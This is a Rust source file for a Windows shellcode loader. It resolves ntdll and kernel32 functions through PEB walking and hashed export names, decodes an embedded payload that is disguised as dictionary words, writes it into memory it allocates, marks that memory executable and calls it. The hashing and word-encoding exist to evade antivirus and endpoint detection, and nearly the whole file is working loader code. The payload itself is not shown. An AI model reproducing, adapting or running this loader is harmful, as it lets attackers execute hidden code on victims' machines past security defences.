mod peb_walk;
use std::mem::transmute;

const PAYLOAD: &str = include_str!("../payload.out");
const DICTIONARY: &str = include_str!("../shellcode_encoder/dictionary.txt");

fn main() {
    unsafe {
        let ntdll = peb_walk::get_module_base_by_hash(0x1edab0ed);
        if ntdll.is_null() {
            return;
        }
        println!("[+] NTDLL: {:p}", ntdll);
        let kernel32 = peb_walk::get_module_base_by_hash(0x6ddb9555);
        if kernel32.is_null() {
            return;
        }
        println!("[+] KERNEL32: {:p}", ntdll);
        let addr_get_proc = match peb_walk::get_export_by_hash(kernel32, 0x3f025f67) {
            Some(v) => {
                println!("[+] GetCurrentProcess: {:p}", v as *const ());
                v
            }
            None => return,
        };
        let addr_nt_alloc = match peb_walk::get_export_by_hash(ntdll, 0xf783b8ec) {
            Some(v) => {
                println!("[+] NtAllocateVirtualMemory: {:p}", v as *const ());
                v
            }
            None => return,
        };
        let addr_nt_prot = match peb_walk::get_export_by_hash(ntdll, 0x50e92888) {
            Some(v) => {
                println!("[+] NtProtectVirtualMemory: {:p}", v as *const ());
                v
            }
            None => return,
        };
        println!("[+] Fungsi OK. Alokasi...");
        let get_current_process: unsafe extern "system" fn() -> usize = transmute(addr_get_proc);
        let nt_alloc: extern "system" fn(usize, *mut *mut u8, usize, *mut usize, u32, u32) -> i32 =
            transmute(addr_nt_alloc);
        let nt_protect: extern "system" fn(usize, *mut *mut u8, *mut usize, u32, *mut u32) -> i32 =
            transmute(addr_nt_prot);
        let mut base: *mut u8 = std::ptr::null_mut();
        let mut size: usize = 8192;
        let h_process = get_current_process();
        println!("[+] Got current process handle!");
        let status = nt_alloc(h_process, &mut base, 0, &mut size, 0x3000, 0x04);
        println!("[+] Memory permission changed to PAGE_READWRITE...");
        if status == 0 && !base.is_null() {
            println!("[+] Decoding the payload...");
            decode_to_memory(PAYLOAD, DICTIONARY, base);
            let mut old_protect: u32 = 0;
            let mut protect_size = size;
            let mut protect_base = base;
            let prot_status = nt_protect(
                h_process,
                &mut protect_base,
                &mut protect_size,
                0x20,
                &mut old_protect,
            );
            println!("[+] Memory permission changed to PAGE_EXECUTE_READ");
            if prot_status == 0 {
                println!("[+] Popping shellcode...");
                let shell: extern "C" fn() = transmute(base);
                shell();
                println!("[+] Popped out!");
            }
        }
    }
}

fn decode_to_memory(payload: &str, dict_raw: &str, out_ptr: *mut u8) {
    let dict: Vec<&str> = dict_raw
        .lines()
        .map(|l| l.trim())
        .filter(|l| !l.is_empty())
        .collect();
    let mut offset = 0;
    for word in payload.split_whitespace() {
        let clean_word = word.trim();
        if let Some(pos) = dict.iter().position(|&x| x == clean_word) {
            unsafe {
                std::ptr::write(out_ptr.add(offset), pos as u8);
                offset += 1;
            }
        }
    }
}
